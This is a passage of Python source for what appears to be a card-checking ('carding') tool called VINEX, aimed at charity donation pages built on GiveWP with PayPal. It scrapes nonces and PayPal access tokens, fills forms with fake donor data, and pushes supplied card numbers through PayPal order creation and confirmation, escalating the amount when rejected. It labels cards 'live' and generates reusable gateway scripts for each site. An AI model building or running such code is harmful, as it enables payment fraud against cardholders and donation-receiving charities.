                      r'data-currency=["\']([A-Za-z]{3})["\']',
                      r'"baseCurrency"\s*:\s*"([A-Za-z]{3})"',
                      r'"currency_code"\s*:\s*"([A-Za-z]{3})"',
                      r'"currencyCode"\s*:\s*"([A-Za-z]{3})"',
                      r'og:price:currency"\s+content="([A-Za-z]{3})"']:
                m = re.search(p, c, re.I)
                if m: self.currency = m.group(1).upper(); break
            else:
                for p in [r'"currency_symbol"\s*:\s*"([^"]+)"',
                          r'"currencySymbol"\s*:\s*"([^"]+)"']:
                    m = re.search(p, c)
                    if m:
                        sym = m.group(1)
                        if sym in SYMBOL_TO_CURRENCY:
                            self.currency = SYMBOL_TO_CURRENCY[sym]; break

            # price levels
            self.price_levels = []
            seen = set()
            def _add(pid, amt):
                try:
                    amt_f = float(str(amt).replace(',', ''))
                    pid_s = str(pid).strip()
                    if pid_s and amt_f > 0 and (pid_s, amt_f) not in seen:
                        seen.add((pid_s, amt_f))
                        self.price_levels.append((pid_s, amt_f))
                except Exception: pass

            for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', c, re.I):
                _add(m.group(1), m.group(2))
            for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', c, re.I):
                _add(m.group(2), m.group(1))
            for m in re.finditer(r'<select[^>]*name=["\']give-price-id["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.I):
                inner = m.group(1)
                for om in re.finditer(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*data-price=["\']([\d.]+)["\']', inner):
                    _add(om.group(1), om.group(2))
            self.price_levels = sorted(self.price_levels, key=lambda x: x[1])

            # current price id
            for p in [r'name="give-price-id"\s+value="([^"]+)"',
                      r'"give-price-id"\s*:\s*"([^"]+)"',
                      r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*checked',
                      r'<input[^>]*checked[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\']']:
                m = re.search(p, c, re.I)
                if m: self.current_price_id = m.group(1); break

            # ─── كل الـ FIELDS ───
            self.form_fields = {}
            # selects
            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.I):
                try:
                    name = m.group(1); inner = m.group(2); tag = m.group(0)
                    required = 'required' in tag.lower()
                    opts = []
                    for om in re.finditer(r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>', inner):
                        v = om.group(1).strip()
                        if v and is_valid_option(v): opts.append(v)
                    self.form_fields[name] = {'type': 'select', 'required': required, 'options': opts}
                except Exception: continue
            # radios
            radio = {}
            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        name = nm.group(1); val = vm.group(1)
                        if name not in radio:
                            radio[name] = {'required': 'required' in tag.lower(), 'options': [], 'checked': None}
                        if val and val not in radio[name]['options']:
                            radio[name]['options'].append(val)
                        if 'checked' in tag.lower(): radio[name]['checked'] = val
                except Exception: continue
            for name, info in radio.items():
                self.form_fields[name] = {'type': 'radio', 'required': info['required'],
                                           'options': info['options'], 'checked': info['checked']}
            # text/email/tel/number/date
            for m in re.finditer(r'<input([^>]*)>', c, re.I):
                try:
                    tag = m.group(0)
                    typ = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
                    if not typ: continue
                    t = typ.group(1).lower()
                    if t in ('hidden', 'submit', 'button', 'radio', 'checkbox', 'file', 'image'):
                        continue
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if nm and nm.group(1) not in self.form_fields:
                        self.form_fields[nm.group(1)] = {
                            'type': t,
                            'required': 'required' in tag.lower(),
                            'options': [],
                            'placeholder': (re.search(r'placeholder=["\']([^"\']*)["\']', tag) or type('',(),{'group':lambda s,i:''})()).group(1),
                        }
                except Exception: continue
            # checkboxes
            checkboxes = {}
            for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm:
                        name = nm.group(1); val = vm.group(1) if vm else 'on'
                        if name not in checkboxes:
                            checkboxes[name] = {'required': 'required' in tag.lower(), 'value': val, 'checked': 'checked' in tag.lower()}
                except Exception: continue
            for name, info in checkboxes.items():
                self.form_fields[name] = {'type': 'checkbox', 'required': info['required'],
                                          'options': [info['value']], 'checked': info['checked']}

            # ─── TERMS / TOS ───
            self.terms_fields = []
            terms_patterns = [
                r'name=["\']([^"\']*terms?[^"\']*)["\']',
                r'name=["\']([^"\']*tos[^"\']*)["\']',
                r'name=["\']([^"\']*agree[^"\']*)["\']',
                r'name=["\']([^"\']*conditions?[^"\']*)["\']',
            ]
            for pat in terms_patterns:
                for m in re.finditer(pat, c, re.I):
                    n = m.group(1)
                    if n and n not in self.terms_fields:
                        self.terms_fields.append(n)
            # إضافة terms_fields للـ form_fields لو مش موجودة
            for tn in self.terms_fields:
                if tn not in self.form_fields:
                    self.form_fields[tn] = {'type': 'checkbox', 'required': True, 'options': ['on']}

            # ─── HIDDEN FIELDS ───
            self.hidden_fields = {}
            for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        self.hidden_fields[nm.group(1)] = vm.group(1)
                except Exception: continue

            # ─── BUTTONS ───
            self.buttons = []
            for m in re.finditer(r'<(?:button|input)[^>]*type=["\'](submit|button)["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    label_m = re.search(r'value=["\']([^"\']+)["\']', tag) or re.search(r'>([^<]+)<', tag)
                    label = label_m.group(1).strip() if label_m else ''
                    self.buttons.append({'label': label, 'tag': tag[:200]})
                except Exception: continue

            # ─── FORM STEPS ───
            # كشف لو الفورم فيه steps (multistep)
            step_markers = len(re.findall(r'data-step["\']?\s*[:=]\s*["\']?\d', c))
            step_markers += len(re.findall(r'give-form-step', c))
            step_markers += len(re.findall(r'class=["\'][^"\']*step[^"\']*["\']', c))
            if step_markers > 0:
                self.form_steps = ['step1', 'step2', 'step3']
            else:
                self.form_steps = ['single']

            if 'admin-ajax.php' in c and not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except Exception: pass

    def _add_candidate(self, token, source):
        if not token or len(token) < 20: return
        for c in self.token_candidates:
            if c['token'] == token: return
        self.token_candidates.append({'token': token, 'source': source})

    def _extract_tokens_from_text(self, text, source):
        try:
            for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', text, re.I):
                self._add_candidate(m.group(1), source)
            for m in re.finditer(r'"access_token"\s*:\s*"([^"]+)"', text, re.I):
                self._add_candidate(m.group(1), source)
            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', text):
                self._add_candidate(m.group(1), f'{source}-A21')
        except Exception: pass

    def _extract_tokens(self):
        if self.au: return
        c = self.all_content
        for p in [r'"data-client-token":"([^"]+)"', r'data-client-token=["\']([^"\']+)["\']']:
            m = re.search(p, c)
            if m:
                enc = m.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    tm = re.search(r'"accessToken":"([^"]+)"', dec)
                    if tm: self.au = tm.group(1)
                    mm = re.search(r'merchant_id=([\w]+)', dec)
                    if mm: self.paypal = mm.group(1)
                    cm = re.search(r'"clientId":"([^"]+)"', dec)
                    if cm: self.client_id = cm.group(1)
                    if self.au: return
                except Exception: pass
        for p in [r'"accessToken"\s*:\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
            m = re.search(p, c, re.IGNORECASE)
            if m: self.au = m.group(1); return

    def _try_oauth(self):
        if self.au or not self.client_id: return False
        try:
            auth = base64.b64encode(f"{self.client_id}:".encode()).decode()
            r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                headers={'authorization': f'Basic {auth}', 'content-type': 'application/x-www-form-urlencoded'},
                data={'grant_type': 'client_credentials'}, timeout=10)
            if r.status_code == 200:
                j = r.json()
                if 'access_token' in j:
                    self.au = j['access_token']
                    self._token_ts = time.time()
                    self.auth_method = 'oauth'
                    return True
        except Exception: pass
        return False

    def _try_ajax_client_token(self):
        if self.au or not self.ajax_url or not self.id_form2: return False
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token',
                       'paypal_get_client_token', 'give_paypal_get_client_token']:
            try:
                r = self.r.post(self.ajax_url, data={'action': action, 'form-id': self.id_form2},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=8)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = j.get('data') if isinstance(j.get('data'), str) else None
                        if not token and isinstance(j.get('data'), dict):
                            token = j['data'].get('client_token') or j['data'].get('access_token')
                        if token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken":"([^"]+)"', dec)
                                if tm: self.au = tm.group(1); return True
                            except Exception: pass
                            if len(token) > 20:
                                self.au = token
                                return True
                    except Exception: pass
            except Exception: continue
        return False

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2: return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self._safe_post(self.ajax_url,
                    data={'action': action, 'form_id': self.id_form2},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=5)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonce = j['data']; self._nonce_ts = time.time(); return True
                        if 'nonce' in j:
                            self.nonce = j['nonce']; self._nonce_ts = time.time(); return True
                    except Exception: pass
        except Exception: pass
        return False

    def _detect_gateway_type(self):
        try:
            c = self.all_content
            if 'braintreegateway.com' in c and 'data-client-token' in c: self.gateway_type = 'braintree'
            elif 'paypal.com/sdk/js' in c and 'client-id=' in c: self.gateway_type = 'paypal_sdk'
            elif 'give_paypal_commerce' in c: self.gateway_type = 'givewp_paypal'
            elif 'paypal' in c.lower(): self.gateway_type = 'paypal_unknown'
            else: self.gateway_type = 'unknown'
        except Exception: self.gateway_type = 'unknown'

    def _refresh_nonce(self):
        try:
            if self._try_ajax_nonce(): return True
            r = self._safe_get(self.page_url, timeout=10)
            if not r or r.status_code != 200: return False
            h = r.text
            self.page_html = h; self.all_content = h
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', h)
            if m: self.nonce = m.group(1); self._nonce_ts = time.time()
            return bool(self.nonce)
        except Exception: return False

    def _refresh_all(self):
        """تحديث كل حاجة محتاجة تحديث — token + nonce"""
        try:
            if not self.nonce or (time.time() - self._nonce_ts) > 300:
                self._refresh_nonce()
            if not self.au or (time.time() - self._token_ts) > 1800:
                self._extract_tokens()
                if not self.au:
                    self._try_ajax_client_token()
                if not self.au and self.client_id:
                    self._try_oauth()
            self._save_cache()
        except Exception: pass

    def _autofill_form(self, extra=None):
        """ملء كل الفورم — بما فيه terms/shit"""
        fd = {}
        try:
            for name, info in self.form_fields.items():
                if name.startswith(('give-form-', 'give_')):
                    continue
                if name in self.hidden_fields:
                    fd[name] = self.hidden_fields[name]
                    continue
                ft = info.get('type', '')
                opts = [o for o in info.get('options', []) if is_valid_option(o)]
                nl = name.lower()
                if ft == 'checkbox':
                    if info.get('checked') or name in self.terms_fields:
                        fd[name] = info['options'][0] if info['options'] else 'on'
                elif ft in ('select', 'radio'):
                    if not opts: continue
                    fd[name] = info.get('checked') or opts[0]
                elif ft == 'email': fd[name] = self.email
                elif ft == 'number': fd[name] = '1'
                elif ft == 'tel': fd[name] = '1234567890'
                elif ft == 'date': fd[name] = '1990-01-01'
                else:
                    if 'first' in nl: fd[name] = random.choice(FIRST_NAMES)
                    elif 'last' in nl: fd[name] = random.choice(LAST_NAMES)
                    elif 'name' in nl: fd[name] = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
                    elif 'email' in nl: fd[name] = self.email
                    elif any(k in nl for k in ('phone', 'mobile', 'tel')): fd[name] = '1234567890'
                    elif any(k in nl for k in ('address', 'street')): fd[name] = '123 Main St'
                    elif 'city' in nl: fd[name] = 'New York'
                    elif any(k in nl for k in ('zip', 'postal')): fd[name] = '10001'
                    elif 'state' in nl: fd[name] = 'NY'
                    elif 'country' in nl: fd[name] = 'US'
                    elif 'nric' in nl or 'fin' in nl: fd[name] = 'S1234567A'
                    elif 'amount' in nl: fd[name] = self.donation
                    else: fd[name] = 'Test'
        except Exception: pass
        if extra:
            fd.update(extra)
        return fd

    def Key(self):
        try:
            if not self.page_url or 'invalid.local' in self.page_url: return False

            if self.au and self.nonce and self.id_form2 and self.ajax_url:
                self._log('cache hit')
                self.auth_method = 'cache'
                return True

            if not self._fetch_page(): return False

            self.cf_detected = self._detect_cloudflare()
            if self.cf_detected and self._solve_cloudflare():
                self._fetch_page()

            self._parallel_extract()
            self._extract_full_form()
            self._extract_tokens()

            if not self.au:
                def _oauth():
                    try: self._try_oauth()
                    except Exception: pass
                def _ajax():
                    try: self._try_ajax_client_token()
                    except Exception: pass
                t1 = threading.Thread(target=_oauth, daemon=True)
                t2 = threading.Thread(target=_ajax, daemon=True)
                t1.start(); t2.start()
                t1.join(timeout=10); t2.join(timeout=10)

            if not self.nonce and self.id_form2: self._try_ajax_nonce()

            if not self.id_form1 and self.id_form2:
                self.id_form1 = f'{self.id_form2}-1'
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

            self._detect_gateway_type()
            self._save_cache()
            return bool(self.id_form2 or self.nonce)
        except Exception as e:
            self._log(f'key: {e}')
            return False

    # ─── BUILD FIELDS (كاملة) ───
    def _build_fields(self, amt, pid=None):
        base = {
            'give-form-id-prefix': self.id_form1 or '',
            'give-form-id': self.id_form2 or '',
            'give-form-hash': self.nonce or '',
            'give-amount': amt,
            'give-currency': self.currency,
            'give-form-minimum': self.minimum,
            'give-form-maximum': '999999.99',
            'give-form-title': 'Donation',
            'give-current-url': self.page_url,
            'give-form-url': f'https://{self.url}/give/{self.id_form2}/',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(FIRST_NAMES),
            'give_last': random.choice(LAST_NAMES),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
            'give_agree_to_terms': 'on',
            'give_terms_agreement': 'on',
            'give_embed_form': '1',
        }
        # أضف الـ hidden fields
        for k, v in self.hidden_fields.items():
            if k not in base:
                base[k] = v
        # أضف كل terms fields
        for tn in self.terms_fields:
            if tn not in base:
                base[tn] = 'on'
        # أضف أي form fields إضافية (اللي مش في base)
        extra = self._autofill_form()
        for k, v in extra.items():
            if k not in base:
                base[k] = v
        if pid is not None:
            base['give-price-id'] = pid
        return base

    # ─── ATTEMPT — smart waiting ───
    def _attempt(self, n, mm, yy, cvc, amt):
        self.donation = amt
        expiry = f"20{yy}-{mm}"
        self._refresh_all()

        price_ids = ['custom', '3', '4', '', None]
        if self.current_price_id and self.current_price_id not in price_ids:
            price_ids.insert(0, self.current_price_id)

        order_id = None
        last_err = ""

        for pid in price_ids:
            fields = self._build_fields(amt, pid)
            try:
                da = MultipartEncoder({k: (None, str(v)) for k, v in fields.items()})
                he = {'content-type': da.content_type, 'user-agent': self.uu.random,
                      'x-requested-with': 'XMLHttpRequest',
                      'referer': self.page_url, 'origin': f'https://{self.url}'}
                r3 = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_create_order'},
                    headers=he, data=da, timeout=12)
                j = r3.json()
                if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                    order_id = j['data']['id']
                    break
                else:
                    last_err = str(j.get('data', {}).get('error', 'fail'))
                    if 'Donation amount' in last_err and 'invalid' in last_err.lower():
                        m = re.search(r'minimum.*?([\d.]+)', last_err, re.I)
                        if m:
                            try:
                                new_min = float(m.group(1))
                                if new_min > float(amt):
                                    amt = f"{new_min:.2f}"
                                    self.minimum = amt
                            except Exception: pass
            except Exception as e:
                last_err = f"EXC: {str(e)[:100]}"

        if not order_id:
            return None, last_err

        # confirm
        try:
            metadata = self.paypal or self.client_id or ''
            he4 = {
                'authorization': f'Bearer {self.au or ""}',
                'paypal-client-metadata-id': metadata,
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': self.uu.random,
            }
            da3 = {
                'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
                'application_context': {'vault': False},
            }
            cr = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=he4, json=da3, timeout=12)
            confirm_body = cr.text
        except Exception:
            confirm_body = ""

        # approve
        for pid in price_ids:
            try:
                fields = self._build_fields(amt, pid)
                da = MultipartEncoder({k: (None, str(v)) for k, v in fields.items()})
                he = {'content-type': da.content_type, 'user-agent': self.uu.random,
                      'x-requested-with': 'XMLHttpRequest',
                      'referer': self.page_url, 'origin': f'https://{self.url}'}
                r5 = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    headers=he, data=da, timeout=12)
                text = r5.text + confirm_body
                if '"success":true' in text.lower() and 'error' not in text.lower():
                    return f'CHARGE {amt}$', text
                for kw in LIVE_RESPONSES:
                    if kw.upper() in text.upper():
                        return kw, text
                try:
                    err = str(r5.json()['data']['error'])[:200]
                    if err and err != "None":
                        return err, text
                except Exception: pass
            except Exception: pass

        return confirm_body[:150] if confirm_body else "Approve failed", confirm_body

    def Charge(self, ccx):
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy: yy = yy.split("20")[1]

        try:
            min_val = float(self.minimum)
        except Exception:
            min_val = 5.00
        if min_val <= 0: min_val = 1.00
        attempts = [f"{min_val:.2f}"]
        escalation = [f"{min_val * 2:.2f}", f"{min_val * 5:.2f}", f"{min_val * 10:.2f}"]

        all_results = []
        create_errors = []
        q = list(attempts)
        while q:
            amt = q.pop(0)
            res, text = self._attempt(n, mm, yy, cvc, amt)
            if res:
                all_results.append({'amount': amt, 'result': res, 'text': text})
                if 'Donation amount' in str(res) and 'invalid' in str(res).lower():
                    if escalation: q.append(escalation.pop(0))
                    continue
                break
            else:
                create_errors.append((amt, text))
                if text and 'Donation amount' in text and 'invalid' in text.lower():
                    if escalation: q.append(escalation.pop(0))

        if not all_results:
            if create_errors:
                last_amt, last_err = create_errors[-1]
                self.donation = last_amt
                return last_err if last_err else "No response"
            return "No response"

        best = max(all_results, key=lambda x: score_result(x['result']))
        self.donation = best['amount']
        res = best['result']
        if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
            return "Payer cannot pay for this transaction."
        return res

    # ─── CONFIG للـ gateway المولّد ───
    def export_config(self):
        """كل حاجة محتاجة تتحفظ في الـ gateway"""
        return {
            'page_url': self.page_url,
            'host': self.url,
            'ajax_url': self.ajax_url,
            'id_form1': self.id_form1,
            'id_form2': self.id_form2,
            'nonce': self.nonce,
            'access_token': self.au,
            'paypal_meta': self.paypal,
            'client_id': self.client_id,
            'currency': self.currency,
            'minimum': self.minimum,
            'current_price_id': self.current_price_id,
            'price_levels': self.price_levels,
            'form_fields': self.form_fields,
            'terms_fields': self.terms_fields,
            'hidden_fields': self.hidden_fields,
            'form_steps': self.form_steps,
            'buttons': [b['label'] for b in self.buttons[:10]],
            'gateway_type': self.gateway_type,
            'auth_method': self.auth_method,
            'donation': self.donation,
            'saved_at': time.time(),
        }


# ═══════════════════════════════════════════════════════════════
#  BRIDGE
# ═══════════════════════════════════════════════════════════════
def check_single_link(link):
    try:
        link = safe_url(link)
        if not link:
            return {'link': 'Invalid', 'live': False, 'respons': 'BAD_URL',
                    'amount': '5.00', 'tester': None, 'config': None}
        tester = VinexTester(link)
        if not tester.Key():
            return {'link': link[:100], 'live': False, 'respons': 'FETCH_FAILED',
                    'amount': '5.00', 'tester': tester, 'config': None}
        result = tester.Charge(TEST_CARD)
        live = is_live_response(result)
        cfg = tester.export_config()
        return {'link': link[:100], 'live': live, 'respons': str(result)[:300],
                'amount': tester.donation, 'minimum': tester.minimum,
                'currency': tester.currency, 'auth': tester.auth_method,
                'tester': tester, 'config': cfg}
    except Exception:
        return {'link': str(link)[:100] if link else 'Invalid', 'live': False,
                'respons': 'FATAL', 'amount': '5.00', 'tester': None, 'config': None}
                # ═══════════════════════════════════════════════════════════════
#  GATEWAY TEMPLATE v26.0 — Lives 1 Week
# ═══════════════════════════════════════════════════════════════
GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#  VINEX Gateway v26.0 — Smart Edition
#  Generated: $generated_at
#  Site:      $page_url
#  Response:  $initial_response
#  Amount:    $initial_amount
# ═══════════════════════════════════════════════════════════════
import requests, re, random, time, base64, os, sys, json
try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0')
    def rand_ua():
        try: return _UU.random
        except Exception: return 'Mozilla/5.0'
except Exception:
    def rand_ua(): return 'Mozilla/5.0'
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
#  CONFIG — كل حاجة متسجلة هنا (عشان تعيش أسبوع)
# ═══════════════════════════════════════════════════════════════
CONFIG = $config_json

PAGE_URL = CONFIG['page_url']
HOST     = CONFIG['host']
AJAX_URL = CONFIG['ajax_url']
ID_FORM1 = CONFIG['id_form1'] or ''
ID_FORM2 = CONFIG['id_form2'] or ''
NONCE    = CONFIG['nonce'] or ''
AU       = CONFIG['access_token'] or ''
PAYPAL   = CONFIG['paypal_meta'] or ''
CLIENT_ID = CONFIG['client_id'] or ''
CURRENCY = CONFIG['currency'] or 'USD'
MINIMUM  = CONFIG['minimum'] or '5.00'
CURRENT_PID = CONFIG['current_price_id'] or ''
PRICE_LEVELS = CONFIG.get('price_levels') or []
FORM_FIELDS = CONFIG.get('form_fields') or {}
TERMS_FIELDS = CONFIG.get('terms_fields') or []
HIDDEN_FIELDS = CONFIG.get('hidden_fields') or {}
FORM_STEPS = CONFIG.get('form_steps') or ['single']
GATEWAY_TYPE = CONFIG.get('gateway_type') or 'unknown'
AUTH_METHOD = CONFIG.get('auth_method') or 'none'
GENERATED_AT = CONFIG.get('saved_at') or time.time()

FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller']

LIVE_RESPONSES = $live_responses_json


# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════
def extract_response_text(b):
    if not b: return ''
    s = str(b).strip()
    if not s: return ''
    try:
        j = json.loads(s)
        if isinstance(j, dict):
            d = j.get('data')
            if isinstance(d, dict):
                det = d.get('details')
                if isinstance(det, list) and det:
                    for x in det:
                        if isinstance(x, dict):
                            for k in ('description', 'issue', 'reason'):
                                v = x.get(k)
                                if v and str(v).strip().lower() not in ('none', 'null', ''): return str(v)[:300]
                for k in ('error', 'message', 'msg', 'reason', 'detail', 'description', 'name'):
                    v = d.get(k)
                    if v and str(v).strip().lower() not in ('none', 'null', 'false', ''): return str(v)[:300]
            elif isinstance(d, str) and d.strip(): return d[:300]
            for k in ('error', 'message', 'msg', 'detail', 'reason', 'description'):
                v = j.get(k)
                if v and str(v).strip().lower() not in ('none', 'null', '', 'false'): return str(v)[:300]
    except Exception: pass
    return s[:300]


_JUNK = ['give-', 'screen-reader', 'give-label', 'give-required', 'give-where']
_JUNK_E = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}

def is_valid_option(o):
    if not o or not isinstance(o, str): return False
    x = o.strip()
    if not x: return False
    l = x.lower()
    if l in _JUNK_E: return False
    for p in _JUNK:
        if p in l: return False
    if len(x) > 60 or x.startswith(('{', '[', '<')): return False
    return True


def luhn_check(cn):
    try:
        d = [int(x) for x in str(cn)]; o = d[-1::-2]; e = d[-2::-2]
        t = sum(o)
        for x in e: t += sum([int(y) for y in str(x * 2)])
        return t % 10 == 0
    except Exception: return False


def is_card_decline(t):
    if not t: return False
    up = str(t).upper()
    for kw in LIVE_RESPONSES:
        if kw.upper() in up: return True
    return False


# ═══════════════════════════════════════════════════════════════
#  PAYPAL CLASS
# ═══════════════════════════════════════════════════════════════
class PayPal:
    def __init__(self):
        self.email = "%s%s%d@gmail.com" % (random.choice(FIRST_NAMES),
                                            random.choice(LAST_NAMES),
                                            random.randint(100, 999))
        self.r = requests.Session()
        self.r.verify = False
        self.r.headers.update({'user-agent': rand_ua()})
        self.nonce = NONCE
        self.au = AU
        self.donation = MINIMUM
        self.minimum = MINIMUM
        self.currency = CURRENCY
        self.last_order_id = None
        self.last_order_status = None
        self.last_capture_id = None
        self.tier_used = None
        self._nonce_ts = time.time()
        self._token_ts = time.time()
        try:
            self.r.get('https://%s/' % HOST, timeout=15)
            self.r.get(PAGE_URL, timeout=15)
        except Exception: pass

    # ─── Refresh ───
    def _refresh_nonce(self):
        try:
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self.r.post(AJAX_URL,
                    data={'action': action, 'form_id': ID_FORM2},
                    headers={'x-requested-with': 'XMLHttpRequest', 'referer': PAGE_URL},
                    timeout=6)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonce = j['data']; self._nonce_ts = time.time(); return True
                        if 'nonce' in j:
                            self.nonce = j['nonce']; self._nonce_ts = time.time(); return True
                    except Exception: pass
        except Exception: pass
        # Fallback: reload page
        try:
            r = self.r.get(PAGE_URL, timeout=12)
            if r and r.status_code == 200:
                m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', r.text)
                if m:
                    self.nonce = m.group(1); self._nonce_ts = time.time(); return True
        except Exception: pass
        return False

    def _refresh_token(self):
        try:
            r = self.r.get(PAGE_URL, timeout=12)
            if not r: return False
            c = r.text
            for p in [r'"data-client-token":"([^"]+)"', r'data-client-token=["\']([^"\']+)["\']']:
                m = re.search(p, c)
                if m:
                    try:
                        dec = base64.b64decode(m.group(1) + '=' * (-len(m.group(1)) % 4)).decode('utf-8', errors='ignore')
                        tm = re.search(r'"accessToken":"([^"]+)"', dec)
                        if tm:
                            self.au = tm.group(1); self._token_ts = time.time(); return True
                    except Exception: pass
            for p in [r'"accessToken"\s*:\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
                m = re.search(p, c, re.IGNORECASE)
                if m:
                    self.au = m.group(1); self._token_ts = time.time(); return True
        except Exception: pass
        return False

    def _refresh_all(self):
        if not self.nonce or (time.time() - self._nonce_ts) > 300:
            self._refresh_nonce()
        if not self.au or (time.time() - self._token_ts) > 1800:
            self._refresh_token()

    # ─── Build fields ───
    def _build_fields(self, amt, pid=None):
        base = {
            'give-form-id-prefix': ID_FORM1,
            'give-form-id': ID_FORM2,
            'give-form-hash': self.nonce,
            'give-amount': amt,
            'give-currency': self.currency,
            'give-form-minimum': self.minimum,
            'give-form-maximum': '999999.99',
            'give-form-title': 'Donation',
            'give-current-url': PAGE_URL,
            'give-form-url': f'https://{HOST}/give/{ID_FORM2}/',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(FIRST_NAMES),
            'give_last': random.choice(LAST_NAMES),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
            'give_agree_to_terms': 'on',
            'give_terms_agreement': 'on',
            'give_embed_form': '1',
        }
        for k, v in HIDDEN_FIELDS.items():
            if k not in base: base[k] = v
        for tn in TERMS_FIELDS:
            if tn not in base: base[tn] = 'on'
        # autofill required fields
        for name, info in FORM_FIELDS.items():
            if name in base or name.startswith(('give-form-', 'give_')): continue
            ft = info.get('type', '')
            opts = [o for o in info.get('options', []) if is_valid_option(o)]
            nl = name.lower()
            if ft == 'checkbox':
                if info.get('checked') or name in TERMS_FIELDS:
                    base[name] = opts[0] if opts else 'on'
            elif ft in ('select', 'radio'):
                if opts: base[name] = info.get('checked') or opts[0]
            elif ft == 'email': base[name] = self.email
            elif ft == 'number': base[name] = '1'
            elif ft == 'tel': base[name] = '1234567890'
            elif ft == 'date': base[name] = '1990-01-01'
            else:
                if 'first' in nl: base[name] = random.choice(FIRST_NAMES)
                elif 'last' in nl: base[name] = random.choice(LAST_NAMES)
                elif 'name' in nl: base[name] = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
                elif 'email' in nl: base[name] = self.email
                elif any(k in nl for k in ('phone', 'mobile', 'tel')): base[name] = '1234567890'
                elif 'amount' in nl: base[name] = amt
                else: base[name] = 'Test'
        if pid is not None:
            base['give-price-id'] = pid
        return base

    # ─── attempt ───
    def _attempt(self, n, mm, yy, cvc, amt):
        self.donation = amt
        expiry = f"20{yy}-{mm}"
        self._refresh_all()

        price_ids = ['custom', '3', '4', '', None]
        if CURRENT_PID and CURRENT_PID not in price_ids:
